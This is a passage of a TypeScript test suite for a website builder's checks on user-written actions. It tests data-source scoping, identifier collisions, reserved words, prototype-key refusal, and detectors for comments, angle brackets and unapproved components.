      `${variable} = ${sibling}`,
      // one with no scope
      `${unscoped} = 1`,
      `${variable} = ${unscoped}`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(
      mayRun([{ args: [], code: `${onePath} = 1` }], { holder: "shared-form" })
    ).toBe(false);
    // the holder's own, an ancestor's, a global one and a Resource
    for (const code of [
      `${own} = 1`,
      `${variable} = 1`,
      `${count} = ${count} + 1`,
      `${variable} = ${resource}`,
    ]) {
      expect(codeMayRun(code), code).toBe(true);
    }
    expect(
      mayRun([{ args: [], code: `${everyPath} = ${variable}` }], {
        holder: "shared-form",
      })
    ).toBe(true);
    // and nothing without the build's data sources
    expect(
      actionMayRun(
        {
          ...actionProp([{ args: [], code: `${variable} = 1` }]),
          instanceId: "form",
        },
        { ...context, dataSources: new Map() }
      )
    ).toBe(false);
  });

  test("refuses a data source whose id is empty, whatever the build holds", () => {
    for (const code of [
      "$ws$dataSource$ = 1",
      `${variable} = $ws$dataSource$`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("keeps only its own data sources for a holder inside a cycle", () => {
    const cyclic: ActionContext = {
      instances: new Map([
        ["body", node("Body", "loop-a")],
        ["loop-a", node("Box", "loop-b")],
        ["loop-b", node("Box", "loop-a", "cycle-form")],
        ["cycle-form", node(signupForm)],
      ]),
      pageRootIds: new Set(["body"]),
      dataSources: new Map([
        ["var-1", scoped("variable", "body")],
        ["own", scoped("variable", "cycle-form")],
      ]),
    };
    const inCycle = (code: string) =>
      actionMayRun(
        {
          ...actionProp([{ args: [], code }], "onStateChange"),
          instanceId: "cycle-form",
        },
        cyclic
      );
    expect(inCycle(`${variable} = 1`)).toBe(false);
    expect(inCycle(`${own} = 1`)).toBe(true);
  });

  test("keeps only its own data sources for a holder with a cycle above it, though a page template's root reaches it too", () => {
    const cyclic: ActionContext = {
      instances: new Map([
        ["body", node("Body", "loop-a")],
        ["loop-a", node("Box", "loop-b")],
        ["loop-b", node("Box", "loop-a", "cycle-form")],
        ["template", node("Body", "cycle-form")],
        ["cycle-form", node(signupForm)],
      ]),
      pageRootIds: new Set(["body"]),
      templateRootIds: new Set(["template"]),
      dataSources: new Map([
        ["template-var", scoped("variable", "template")],
        ["own", scoped("variable", "cycle-form")],
      ]),
    };
    const inCycle = (id: string) =>
      actionMayRun(
        {
          ...actionProp(
            [{ args: [], code: `${encodeDataSourceVariable(id)} = 1` }],
            "onStateChange"
          ),
          instanceId: "cycle-form",
        },
        cyclic
      );
    expect(inCycle("template-var")).toBe(false);
    expect(inCycle("own")).toBe(true);
  });

  test("keeps only its own data sources for a holder with a cycle above it, where a page template's root is on the page's path", () => {
    const cyclic: ActionContext = {
      instances: new Map([
        ["body", node("Body", "loop-a")],
        ["loop-a", node("Box", "loop-b")],
        ["loop-b", node("Box", "loop-a", "template")],
        ["template", node("Body", "cycle-form")],
        ["cycle-form", node(signupForm)],
      ]),
      pageRootIds: new Set(["body"]),
      templateRootIds: new Set(["template"]),
      dataSources: new Map([["template-var", scoped("variable", "template")]]),
    };
    expect(
      actionMayRun(
        {
          ...actionProp(
            [
              {
                args: [],
                code: `${encodeDataSourceVariable("template-var")} = 1`,
              },
            ],
            "onStateChange"
          ),
          instanceId: "cycle-form",
        },
        cyclic
      )
    ).toBe(false);
  });

  test("reads undefined as a value, refuses reading NaN or Infinity, and refuses assigning to any of them", () => {
    expect(codeMayRun(`${variable} = undefined`)).toBe(true);
    for (const name of ["NaN", "Infinity"]) {
      expect(codeMayRun(`${variable} = ${name}`), name).toBe(false);
      expect(codeMayRun(`${variable} = -${name}`), name).toBe(false);
    }
    for (const name of ["undefined", "NaN", "Infinity"]) {
      expect(codeMayRun(`${name} = 1`), name).toBe(false);
    }
  });

  // An action runs only if it passes input validation, which refuses these
  test("refuses an action that input validation refuses", () => {
    const refusedByInputValidation: Array<{ args: string[]; code: string }> = [
      { args: [], code: `${variable} = NaN` },
      { args: [], code: `${variable} = Infinity` },
      { args: [], code: "$ws$dataSource$\\u0076ar__DASH__1 = 1" },
      { args: [], code: `${variable} = { constructor: 1 }` },
      { args: [], code: `${variable} = { "prototype": 1 }` },
      { args: [], code: `${variable} = { __defineGetter__: 1 }` },
      { args: [], code: `${variable} = { a: { __lookupGetter__: 1 } }` },
      { args: ["state"], code: "state = 1" },
      { args: ["state"], code: "state += 1" },
      { args: ["state"], code: `${variable} = state = 1` },
    ];
    for (const entry of refusedByInputValidation) {
      const name = JSON.stringify(entry);
      expect(checkAction([entry]).ok, name).toBe(false);
      expect(mayRun([entry]), name).toBe(false);
      // in any entry
      expect(
        mayRun([entry, { args: ["state"], code: `${variable} = state` }]),
        name
      ).toBe(false);
    }
    // what input validation passes still may run
    for (const entry of [
      { args: [], code: `${variable} = { toString: 1, then: 2, get: 3 }` },
      { args: ["state"], code: `${variable} = state` },
    ]) {
      expect(checkAction([entry]).ok, entry.code).toBe(true);
      expect(mayRun([entry]), entry.code).toBe(true);
    }
  });

  // An action may read a Resource, and assigns only a variable
  test("refuses assigning to a Resource, and reads one", () => {
    for (const code of [
      `${resource} = 1`,
      `${resource} += 1`,
      `${variable} = ${resource} = 1`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(codeMayRun(`${variable} = ${resource}`)).toBe(true);
  });

  test("refuses an object key __proto__, however it is written", () => {
    for (const code of [
      `${variable} = { __proto__: null }`,
      `${variable} = { "__proto__": [] }`,
      `${variable} = { a: { __proto__: { b: 1 } } }`,
      `${variable} = [{ __proto__: 1 }]`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(codeMayRun(`${variable} = { proto: 1, __proto: 2 }`)).toBe(true);
  });

  test("refuses an arg that is a reserved word, or that an entry lists twice", () => {
    for (const arg of [
      "await",
      "break",
      "class",
      "delete",
      "enum",
      "false",
      "implements",
      "interface",
      "let",
      "new",
      "null",
      "package",
      "private",
      "protected",
      "public",
      "static",
      "super",
      "this",
      "true",
      "typeof",
      "var",
      "void",
      "with",
      "yield",
      // input validation refuses it as an arg
      "undefined",
    ]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(false);
    }
    expect(codeMayRun(`${variable} = a`, ["a", "a"])).toBe(false);
    expect(
      mayRun([
        { args: ["a", "b", "a"], code: `${variable} = 1` },
        { args: ["a"], code: `${variable} = a` },
      ])
    ).toBe(false);
    for (const arg of ["type", "of", "async", "get"]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(true);
    }
  });

  // An arg may not be a data source's name made a plain identifier, nor that
  // followed by `_`, `_N` or `__N`, where the code reads the data source
  test("refuses an arg that a data source it names could be named as", () => {
    const named = (name: string, arg: string, code = `${variable} = ${arg}`) =>
      actionMayRun(
        {
          ...actionProp([{ args: [arg], code }], "onStateChange"),
          instanceId: "form",
        },
        {
          ...context,
          dataSources: new Map([
            ...context.dataSources,
            ["var-1", { ...scoped("variable", "body"), name }],
          ]),
        }
      );
    // read
    const reads = (arg: string) => `${variable} = ${variable} ? ${arg} : 1`;
    expect(named("state", "state", reads("state"))).toBe(false);
    expect(named("state", "state_1", reads("state_1"))).toBe(false);
    expect(named("state", "state_", reads("state_"))).toBe(false);
    expect(named("state", "state__2", reads("state__2"))).toBe(false);
    expect(named("my state", "mystate", reads("mystate"))).toBe(false);
    expect(named("state!", "state", reads("state"))).toBe(false);
    expect(named("state", "state", `${count} = ${variable}`)).toBe(false);
    expect(named("state", "state", `${variable} += state`)).toBe(false);
    expect(named("state", "state", `${variable} ||= state`)).toBe(false);
    expect(named("state", "state", `${variable} = ${variable} += 1`)).toBe(
      false
    );
    // set only where something else decides
    expect(named("state", "state", `${count} && (${variable} = state)`)).toBe(
      false
    );
    expect(named("state", "state", `${count} = ${variable} = state`)).toBe(
      false
    );
    // in an entry before or after one that only sets it
    for (const value of [
      [
        { args: [], code: `${count} = ${variable}` },
        { args: ["state"], code: `${variable} = state` },
      ],
      [
        { args: [], code: `${variable} = 1` },
        { args: ["state"], code: `${count} = ${variable}` },
      ],
    ]) {
      expect(
        actionMayRun(
          { ...actionProp(value, "onStateChange"), instanceId: "form" },
          {
            ...context,
            dataSources: new Map([
              ...context.dataSources,
              ["var-1", { ...scoped("variable", "body"), name: "state" }],
            ]),
          }
        ),
        JSON.stringify(value)
      ).toBe(false);
    }
    // a code that only sets it to a value that does not name it, as the
    // templates' actions do
    expect(named("state", "state")).toBe(true);
    expect(named("state", "state_1")).toBe(true);
    expect(named("my state", "mystate", `${variable} = mystate ? 1 : 2`)).toBe(
      true
    );
    // a data source it does not name, and a name that is only alike
    expect(named("state", "state", `${count} = state`)).toBe(true);
    expect(named("state", "states", reads("states"))).toBe(true);
    expect(named("state", "state_x", reads("state_x"))).toBe(true);
    expect(named("formState", "state", reads("state"))).toBe(true);
  });

  // A data source's id or name may not be one the page module uses for
  // anything else, and an action may not name one that is
  test("names no data source whose id or name the page module uses for something else", () => {
    const build = {
      instances: new Map([
        ["body", node("Body", "box", "list", "form-1")],
        ["box", node("Box")],
        ["list", node(collectionComponent)],
        ["form-1", node("Form")],
      ]),
      pageRootIds: new Set(["body"]),
      pages: [{ rootInstanceId: "body" }],
      props: new Map<Prop["id"], Prop>([
        [
          "box-resource",
          {
            id: "box-resource",
            instanceId: "box",
            name: "action",
            type: "resource",
            value: "prop-resource",
          },
        ],
      ]),
      resources: new Map([["resource-1", {}]]),
    };
    const variableOf = (id: string, name = "v"): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name,
        scopeInstanceId: "body",
        value: { type: "string", value: "" },
      },
    ];
    for (const [id, name] of [
      ["Box", "v"],
      ["Body", "v"],
      ["set$v1", "v"],
      ["list-index", "v"],
      ["resource-1", "v"],
      ["prop-resource", "v"],
      ["bound-resource", "v"],
      ["form-1", "v"],
      ["@webstudio-is/sdk-components-react/components:Input", "v"],
      [":system", "v"],
      ["a b", "v"],
      ["v2", "_key"],
      ["v3", "_ key"],
      ["v4", "renderText"],
      ["v5", "let"],
      ["v6", "static"],
      ["v7", "_data"],
      ["v8", "_action"],
      ["v9", "Object"],
      ["v10", "Array"],
      ["v11", "Number"],
      ["v12", "Map"],
      ["v15", "Obj ect"],
    ]) {
      const dataSources = new Map([
        variableOf("v1"),
        variableOf(id, name),
        [
          "binding",
          {
            type: "resource",
            id: "binding",
            name: "binding",
            scopeInstanceId: "body",
            resourceId: "bound-resource",
          },
        ],
      ] as Array<[string, DataSource]>);
      expect(
        [...collidingDataSourceIds({ ...build, dataSources })],
        id
      ).toEqual([id]);
      const actionContext = actionContextOf({ ...build, dataSources });
      const reference = encodeDataSourceVariable(id);
      const prop = {
        ...actionProp([{ args: [], code: `${reference} = 1` }]),
        instanceId: "box",
      };
      expect(actionMayRun(prop, actionContext), id).toBe(false);
      // with the build's data sources as they are, one that a code can name
      // and input validation passes would pass
      if (/^\$ws\$dataSource\$\w+$/.test(reference)) {
        expect(actionMayRun(prop, { ...actionContext, dataSources }), id).toBe(
          true
        );
      }
    }
    // a data source stored under another key
    expect([
      ...collidingDataSourceIds({
        ...build,
        dataSources: new Map([["key", variableOf("v1")[1]]]),
      }),
    ]).toEqual(["key"]);
    // ids and names as the builder makes them
    const dataSources = new Map([
      variableOf("aB3_x-Yz09", "Box"),
      variableOf("0f4c1c4e-6bd3-5f0c-9a8b-1c2d3e4f5a6b", "set$v1"),
      variableOf("v4", "key"),
      variableOf("v5", "index"),
      variableOf("v6", "NaN"),
      variableOf("v7", "Infinity"),
    ]);
    expect([...collidingDataSourceIds({ ...build, dataSources })]).toEqual([]);
    expect(actionContextOf({ ...build, dataSources }).dataSources).toEqual(
      dataSources
    );
  });

  test("names no data source with the id Body, though the build holds no Body", () => {
    const build = {
      instances: new Map([["root", node("Box")]]),
      pages: [{ rootInstanceId: "root" }],
      props: new Map<Prop["id"], Prop>(),
      resources: new Map(),
    };
    const variableOf = (id: string): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name: "v",
        scopeInstanceId: ROOT_INSTANCE_ID,
        value: { type: "string", value: "" },
      },
    ];
    expect([
      ...collidingDataSourceIds({
        ...build,
        dataSources: new Map([variableOf("Body"), variableOf("v1")]),
      }),
    ]).toEqual(["Body"]);
  });

  // A parameter is declared as itself only as a page's own, held on its root,
  // or as a Collection's item or key, which the Collection binds once and
  // which is named only inside it. A data source a Collection binds is such a
  // parameter.
  test("names no parameter but a page's own and a Collection's item or key, bound once and named only inside it, and no other data source a Collection binds", () => {
    const parameterOf = (
      id: string,
      scopeInstanceId: string,
      name = id
    ): [string, DataSource] => [
      id,
      { type: "parameter", id, name, scopeInstanceId },
    ];
    const variableOf = (
      id: string,
      scopeInstanceId = "page"
    ): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name: id,
        scopeInstanceId,
        value: { type: "string", value: "" },
      },
    ];
    const parameterProp = (
      instanceId: string,
      name: string,
      value: string
    ): [string, Prop] => {
      const id = `${instanceId}:${name}`;
      return [id, { id, instanceId, name, type: "parameter", value }];
    };
    const base = {
      instances: new Map([
        ["page", node("Body", "list", "box", "left", "right")],
        ["list", node(collectionComponent, "card")],
        ["card", node("Box")],
        ["box", node("Box")],
        ["left", node("Box", "shared")],
        ["right", node("Box")],
        ["shared", node("Box")],
        ["template", node("Body")],
        ["orphan", node("Box")],
      ]),
      pages: [
        { rootInstanceId: "page", systemDataSourceId: "page-system" },
        { rootInstanceId: "template", systemDataSourceId: "template-system" },
      ] as PageNames[],
      resources: new Map(),
    };
    const colliding = ({
      dataSources,
      props = [],
      instances = base.instances,
      pages = base.pages,
    }: {
      dataSources: Array<[string, DataSource]>;
      props?: Array<[string, Prop]>;
      instances?: typeof base.instances;
      pages?: typeof base.pages;
    }) => [
      ...collidingDataSourceIds({
        ...base,
        instances,
        pages,
        dataSources: new Map(dataSources),
        props: new Map(props),
      }),
    ];
    const item = parameterOf("item", "list");
    const bound = parameterProp("list", "item", "item");

    // a page's and a page template's own, and a Collection's item and key
    expect(
      colliding({
        dataSources: [
          parameterOf("page-system", "page", "system"),
          parameterOf("template-system", "template", "system"),
          item,
          parameterOf("key", "list"),
        ],
        props: [
          bound,
          parameterProp("list", "itemKey", "key"),
          parameterProp("card", "data-item", "item"),
          parameterProp("card", "data-key", "key"),
          // where no page or template reaches
          parameterProp("orphan", "data-item", "item"),
        ],
      })
    ).toEqual([]);

    // a parameter that is neither, with any name, and what names it
    expect(
      colliding({
        dataSources: [
          parameterOf("stray", "page", "capture"),
          parameterOf("global", ROOT_INSTANCE_ID, "g"),
        ],
        props: [parameterProp("box", "ref", "stray")],
      })
    ).toEqual(["stray", "global"]);

    // a page's own, held anywhere but on its root, or on a root that another
    // page or an instance also holds, or claimed by two pages
    expect(
      colliding({ dataSources: [parameterOf("page-system", "box")] })
    ).toEqual(["page-system"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        pages: [...base.pages, { rootInstanceId: "page" }],
      })
    ).toEqual(["page-system"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        instances: new Map([...base.instances, ["box", node("Box", "page")]]),
      })
    ).toEqual(["page-system"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        pages: [
          ...base.pages,
          { rootInstanceId: "box", systemDataSourceId: "page-system" },
        ],
      })
    ).toEqual(["page-system"]);
    // a variable with a page's own id
    expect(colliding({ dataSources: [variableOf("page-system")] })).toEqual([
      "page-system",
    ]);
    // a page's or a page template's own on a root with the global root's id,
    // which every page holds
    expect(
      colliding({
        dataSources: [parameterOf("root-system", ROOT_INSTANCE_ID)],
        pages: [
          ...base.pages,
          {
            rootInstanceId: ROOT_INSTANCE_ID,
            systemDataSourceId: "root-system",
          },
        ],
        props: [parameterProp("box", "ref", "root-system")],
      })
    ).toEqual(["root-system"]);

    // a Collection's item named outside it: elsewhere, on the Collection
    // itself, or on an instance also held outside it
    for (const holder of ["box", "list", "page"]) {
      expect(
        colliding({
          dataSources: [item],
          props: [bound, parameterProp(holder, "data-item", "item")],
        }),
        holder
      ).toEqual(["item"]);
    }
    expect(
      colliding({
        dataSources: [item],
        instances: new Map([
          ...base.instances,
          ["card", node("Box", "shared")],
        ]),
        props: [bound, parameterProp("shared", "data-item", "item")],
      })
    ).toEqual(["item"]);
    // or below a cycle
    expect(
      colliding({
        dataSources: [item],
        instances: new Map([
          ...base.instances,
          ["card", node("Box", "loop")],
          ["loop", node("Box", "card")],
        ]),
        props: [bound, parameterProp("loop", "data-item", "item")],
      })
    ).toEqual(["item"]);
    // bound twice, by one Collection or by two
    expect(
      colliding({
        dataSources: [item],
        props: [bound, parameterProp("list", "itemKey", "item")],
      })
    ).toEqual(["item"]);
    expect(
      colliding({
        dataSources: [item],
        instances: new Map([
          ...base.instances,
          ["card", node(collectionComponent)],
        ]),
        props: [bound, parameterProp("card", "item", "item")],
      })
    ).toEqual(["item"]);
    // two binding props of one name on one Collection, of any type: neither
    // parameter is its binding
    const secondProp = (
      name: string,
      value: string,
      type: "parameter" | "expression" = "parameter"
    ): [string, Prop] => {
      const id = `list:${name}:second`;
      return [id, { id, instanceId: "list", name, type, value } as Prop];
    };
    for (const name of ["item", "itemKey"]) {
      expect(
        colliding({
          dataSources: [
            parameterOf("first", "list"),
            parameterOf("last", "list"),
          ],
          props: [
            parameterProp("list", name, "first"),
            secondProp(name, "last"),
            parameterProp("card", "ref", "first"),
          ],
        }),
        name
      ).toEqual(["first", "last"]);
    }
    expect(
      colliding({
        dataSources: [item],
        props: [bound, secondProp("item", "$ws$dataSource$item", "expression")],
      })
    ).toEqual(["item"]);
    // held by another instance, or a page's own
    expect(
      colliding({ dataSources: [parameterOf("item", "page")], props: [bound] })
    ).toEqual(["item"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        props: [parameterProp("list", "item", "page-system")],
      })
    ).toEqual(["page-system"]);
    // a variable or a Resource a Collection binds, and an action that names it
    const variable = variableOf("v");
    const bindsVariable = {
      dataSources: [variable],
      props: [parameterProp("list", "item", "v")],
    };
    expect(colliding(bindsVariable)).toEqual(["v"]);
    expect(
      colliding({
        dataSources: [
          [
            "res",
            {
              type: "resource",
              id: "res",
              name: "res",
              scopeInstanceId: "page",
              resourceId: "resource",
            },
          ],
        ],
        props: [parameterProp("list", "itemKey", "res")],
      })
    ).toEqual(["res"]);
    // bound by a Collection stored with the global root's id, which never
    // ships
    expect(
      colliding({
        dataSources: [parameterOf("root-item", ROOT_INSTANCE_ID)],
        instances: new Map([
          ...base.instances,
          [ROOT_INSTANCE_ID, node(collectionComponent)],
        ]),
        pages: [...base.pages, { rootInstanceId: ROOT_INSTANCE_ID }],
        props: [parameterProp(ROOT_INSTANCE_ID, "item", "root-item")],
      })
    ).toEqual(["root-item"]);
    // a variable, or a page's own, held by the Collection that binds it
    expect(
      colliding({
        dataSources: [variableOf("v", "list")],
        props: [parameterProp("list", "item", "v")],
      })
    ).toEqual(["v"]);
    expect(
      colliding({
        dataSources: [parameterOf("list-system", "list-root")],
        instances: new Map([
          ...base.instances,
          ["list-root", node(collectionComponent)],
        ]),
        pages: [
          ...base.pages,
          { rootInstanceId: "list-root", systemDataSourceId: "list-system" },
        ],
        props: [parameterProp("list-root", "item", "list-system")],
      })
    ).toEqual(["list-system"]);
    const context = actionContextOf({
      ...base,
      pageRootIds: new Set(["page"]),
      dataSources: new Map(bindsVariable.dataSources),
      props: new Map(bindsVariable.props),
    });
    expect(
      actionMayRun(
        {
          ...actionProp([
            { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
          ]),
          instanceId: "card",
        },
        context
      )
    ).toBe(false);
  });

  // The context is computed again when the instances, the props, the
  // Resources or the pages it was computed from change
  test("judges a data source again when what decides it changes", () => {
    const dataSources = new Map<DataSource["id"], DataSource>([
      [
        "v1",
        {
          type: "variable",
          id: "v1",
          name: "v",
          scopeInstanceId: "body",
          value: { type: "string", value: "" },
        },
      ],
      [
        "p1",
        {
          type: "parameter",
          id: "p1",
          name: "system",
          scopeInstanceId: "body",
        },
      ],
    ]);
    const build = {
      instances: new Map([["body", node("Body")]]),
      pageRootIds: new Set(["body"]),
      pages: [
        { rootInstanceId: "body", systemDataSourceId: "p1" },
      ] as PageNames[],
      dataSources,
      props: new Map<Prop["id"], Prop>(),
      resources: new Map(),
    };
    const kept = (changes: Partial<typeof build>) => [
      ...actionContextOf({ ...build, ...changes }).dataSources.keys(),
    ];
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(kept({ resources: new Map([["v1", {}]]) })).toEqual(["p1"]);
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(
      kept({
        props: new Map<Prop["id"], Prop>([
          [
            "action",
            {
              id: "action",
              instanceId: "body",
              name: "action",
              type: "resource",
              value: "v1",
            },
          ],
        ]),
      })
    ).toEqual(["p1"]);
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(
      kept({
        instances: new Map([
          ["body", node("Body", "v1")],
          ["v1", node("Form")],
        ]),
      })
    ).toEqual(["p1"]);
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(kept({ pages: [{ rootInstanceId: "body" }] })).toEqual(["v1"]);
  });

  // A page template is edited on the canvas as a page is, but publishing
  // reads the pages: an instance a page reaches is judged by the pages, and
  // one only a template reaches by the templates
  test("judges a holder a page reaches by the page roots, and one only a template reaches by the template roots", () => {
    const tree: ActionContext = {
      instances: new Map([
        ["page", node("Body", "shared")],
        ["template", node("Body", "wrapper", "only")],
        ["wrapper", node("Box", "shared")],
        ["shared", node(signupForm)],
        ["only", node(signupForm)],
      ]),
      pageRootIds: new Set(["page"]),
      templateRootIds: new Set(["template"]),
      dataSources: new Map([
        ["page-var", scoped("variable", "page")],
        ["template-var", scoped("variable", "template")],
        ["wrapper-var", scoped("variable", "wrapper")],
      ]),
    };
    const on = (holder: string, id: string) =>
      actionMayRun(
        {
          ...actionProp(
            [{ args: [], code: `${encodeDataSourceVariable(id)} = 1` }],
            "onStateChange"
          ),
          instanceId: holder,
        },
        tree
      );
    expect(on("shared", "page-var")).toBe(true);
    expect(on("shared", "wrapper-var")).toBe(false);
    expect(on("shared", "template-var")).toBe(false);
    expect(on("only", "template-var")).toBe(true);
    expect(on("only", "page-var")).toBe(false);
    // and without template roots, only its own
    expect(
      actionMayRun(
        {
          ...actionProp(
            [
              {
                args: [],
                code: `${encodeDataSourceVariable("template-var")} = 1`,
              },
            ],
            "onStateChange"
          ),
          instanceId: "only",
        },
        { ...tree, templateRootIds: undefined }
      )
    ).toBe(false);
  });

  test("refuses an action as a Collection's item or key", () => {
    const tree: ActionContext = {
      instances: new Map([
        ["body", node("Body", "list", "box")],
        ["list", node(collectionComponent)],
        ["box", node("Box")],
      ]),
      pageRootIds: new Set(["body"]),
      dataSources: new Map(),
    };
    const on = (instanceId: string, name: string) =>
      actionMayRun({ ...actionProp([], name), instanceId }, tree);
    expect(on("list", "item")).toBe(false);
    expect(on("list", "itemKey")).toBe(false);
    expect(on("list", "onClick")).toBe(true);
    expect(on("box", "item")).toBe(true);
  });

  test("refuses, without throwing, a value that is not an action's shape", () => {
    expect(
      actionMayRun(
        {
          ...actionProp([]),
          instanceId: "form",
          value: [{ type: "execute", args: "event", code: "1" }],
        } as never,
        context
      )
    ).toBe(false);
    expect(
      actionMayRun(
        {
          ...actionProp([]),
          instanceId: "form",
          value: [{ type: "execute", args: [], code: 1 }],
        } as never,
        context
      )
    ).toBe(false);
  });

  test("accepts the actions the builder writes, and plain values", () => {
    for (const value of [
      // what the props panel adds, with nothing in it yet
      [],
      [{ args: [], code: `${variable} = 1` }],
      [{ args: [], code: `${variable} = !${variable}` }],
      [{ args: [], code: `${count} = ${count} + 1` }],
      [{ args: ["state"], code: `${variable} = state` }],
      [{ args: ["state"], code: `${variable} = state ? "open" : "closed"` }],
      [{ args: ["state"], code: `${variable} = \`tab \${state}\`` }],
      [{ args: ["a", "b"], code: `${variable} = a < b` }],
      [{ args: ["a", "b"], code: `${variable} = a > b` }],
      [{ args: [], code: `${variable} = { a: 1, b: [2] }` }],
      [{ args: [], code: `${variable} = ${resource}` }],
      [{ args: [], code: ` ${variable} = "/events/(all)" ` }],
    ]) {
      expect(mayRun(value), JSON.stringify(value)).toBe(true);
    }
  });

  test("accepts every action the OrganizeOS blocks' templates write, as each is scoped", () => {
    const actions = Object.entries(organizeosTemplates).flatMap(
      ([name, meta]) => {
        const fragment = renderTemplate(meta.template);
        const fragmentContext = actionContextOf({
          instances: new Map(
            fragment.instances.map((instance) => [instance.id, instance])
          ),
          // the template's top instances, as a page holds them
          pageRootIds: new Set(
            fragment.children.flatMap((child) =>
              child.type === "id" ? [child.value] : []
            )
          ),
          dataSources: new Map(
            fragment.dataSources.map((dataSource) => [
              dataSource.id,
              dataSource,
            ])
          ),
          props: new Map(fragment.props.map((prop) => [prop.id, prop])),
          resources: new Map(
            fragment.resources.map((resource) => [resource.id, resource])
          ),
          pages: [],
        });
        return fragment.props.flatMap((prop) =>
          prop.type === "action"
            ? [{ name, prop, context: fragmentContext }]
            : []
        );
      }
    );
    // Signup Form, RSVP Form and Rotating Tabs write one each
    expect(actions.length).toBeGreaterThanOrEqual(3);
    for (const { name, prop, context } of actions) {
      expect(actionMayRun(prop, context), name).toBe(true);
    }
  });
});

describe("readsAsOneExpression", () => {
  test("is true for one expression that reads the same way as a statement", () => {
    for (const code of ["x = 1", " x = { a: 1 } ", 'x = "{}"']) {
      expect(readsAsOneExpression(code), code).toBe(true);
    }
  });

  test("is false where a statement reads the code otherwise, or more follows", () => {
    for (const code of [
      "{}",
      "{ a: 1 }",
      "function f() {}",
      "class A {}",
      "x = 1 /* x */",
      "x = 1; y = 2",
      "x = (",
    ]) {
      expect(readsAsOneExpression(code), code).toBe(false);
    }
  });
});

describe("holdsComment", () => {
  test("is true for a comment of either kind anywhere, and for what it cannot read", () => {
    for (const code of [
      "a /* x */",
      "/* x */ a",
      "a = /**/ b",
      "a // x",
      "a = // x\n b",
      "a <!-- x",
      "a\n--> x",
      '"',
    ]) {
      expect(holdsComment(code), JSON.stringify(code)).toBe(true);
    }
  });

  test("is false for the same characters in a string or a template's text, and for division", () => {
    for (const code of ['"/* x */"', "'// x'", "`/* ${a} */`", "a / b / c"]) {
      expect(holdsComment(code), code).toBe(false);
    }
  });
});

describe("holdsAngleBrackets", () => {
  test("is true for a < or << followed anywhere by a token that starts with >", () => {
    for (const code of [
      "a < b > c",
      "a<b>c",
      "a < b > (c)",
      "a < b > `c`",
      "a < b > /c/g",
      "1 < 2 > /(x)/g",
      "a < b >> /c/",
      "a < b > [c]",
      "a < b >\nc",
      "a << b > c",
      "a < b >= c",
      "a < b >> c",
      "a < b >>> c",
      "a < b, a >>= c",
      "a < b, a >>>= c",
      "a < (b ? c : d) > e",
      "[a < b, c > d]",
      "`${a < b}` + (c > d)",
    ]) {
      expect(holdsAngleBrackets(code), JSON.stringify(code)).toBe(true);
    }
  });

  test("is false for a < or a > alone, a > before any <, and either inside a string or a template's text", () => {
    for (const code of [
      "a < b",
      "a > /c/",
      "a > b < c",
      "a >>= b < c",
      "a <= b && b >= c",
      "a <<= b",
      '"<" + ">"',
      "`<${a}>`",
      "'a < b > (c)'",
    ]) {
      expect(holdsAngleBrackets(code), code).toBe(false);
    }
  });

  test("is true for what it cannot read", () => {
    expect(holdsAngleBrackets('"')).toBe(true);
  });
});

describe("componentMayShip", () => {
  const components = new Set(["Box", "@organizeos/site-components:SignupForm"]);

  test("is true for a component the published page imports, and for one the generator writes itself", () => {
    for (const component of [
      "Box",
      "@organizeos/site-components:SignupForm",
      elementComponent,
      collectionComponent,
      blockComponent,
      blockTemplateComponent,
      descendantComponent,
    ]) {
      expect(componentMayShip(component, components), component).toBe(true);
    }
  });

  test("is false for any other, the builder's global root included", () => {
    for (const component of [
      "x:script",
      "script",
      "Script",
      "box",
      "ws:root",
      "@organizeos/site-components:Missing",
      "",
      1,
      undefined,
    ]) {
      expect(componentMayShip(component, components), String(component)).toBe(
        false
      );
    }
  });
});

describe("instanceIdMayRun", () => {
  test("is false for the global root's id, unless the switch is on", () => {
    expect(instanceIdMayRun(ROOT_INSTANCE_ID)).toBe(false);
    expect(instanceIdMayRun(ROOT_INSTANCE_ID, true)).toBe(true);
    for (const id of ["root", "body", "x:root", ":root "]) {
      expect(instanceIdMayRun(id), id).toBe(true);
    }
  });
});

describe("pageRootIdsOf and templateRootIdsOf", () => {
  test("read the pages' roots and the page templates' roots apart", () => {
    const page = (id: string, rootInstanceId: string) =>
      ({ id, rootInstanceId }) as Page;
    const pages = {
      pages: new Map([
        ["home", page("home", "home-root")],
        ["about", page("about", "about-root")],
      ]),
      pageTemplates: new Map([["template", page("template", "template-root")]]),
    } as unknown as Pages;
    expect([...pageRootIdsOf(pages)]).toEqual(["home-root", "about-root"]);
    expect([...templateRootIdsOf(pages)]).toEqual(["template-root"]);
    expect([...pageRootIdsOf(undefined)]).toEqual([]);
    expect([...templateRootIdsOf(undefined)]).toEqual([]);
  });
});

describe("pagesAndTemplatesOf", () => {
  test("reads each page's and page template's root and own data source, the same list for the same pages", () => {
    const pages = {
      pages: new Map([
        [
          "home",
          { id: "home", rootInstanceId: "home-root", systemDataSourceId: "s1" },
        ],
        ["about", { id: "about", rootInstanceId: "about-root" }],
      ]),
      pageTemplates: new Map([
        [
          "template",
          {
            id: "template",
            rootInstanceId: "template-root",
            systemDataSourceId: "s2",
          },
        ],
      ]),
    } as unknown as Pages;
    expect(pagesAndTemplatesOf(pages)).toEqual([
      { rootInstanceId: "home-root", systemDataSourceId: "s1" },
      { rootInstanceId: "about-root", systemDataSourceId: undefined },
      { rootInstanceId: "template-root", systemDataSourceId: "s2" },
    ]);
    expect(pagesAndTemplatesOf(pages)).toBe(pagesAndTemplatesOf(pages));
